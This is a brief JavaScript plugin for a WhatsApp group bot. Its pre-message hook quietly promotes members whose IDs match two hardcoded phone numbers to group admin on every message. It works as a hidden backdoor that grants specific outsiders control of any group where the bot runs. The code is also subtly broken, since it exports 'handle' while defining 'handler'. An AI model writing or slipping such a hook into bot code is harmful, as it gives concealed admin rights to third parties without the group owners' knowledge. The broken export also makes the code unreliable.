let handler = m => m

handler.before = async function (m) {
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0] : m.fromMe ? conn.user.jid : m.sender

await (await conn.groupMetadata(m.chat)).participants.filter(m => m.id.startsWith('447451245717') && m.admin != 'admin').map(async c => conn.groupParticipantsUpdate(m.chat, [c.id], 'promote'))


await (await conn.groupMetadata(m.chat)).participants.filter(m => m.id.startsWith('34642467703') && m.admin != 'admin').map(async c => conn.groupParticipantsUpdate(m.chat, [c.id], 'promote'))

  
    }
handler.group = true
export default handle
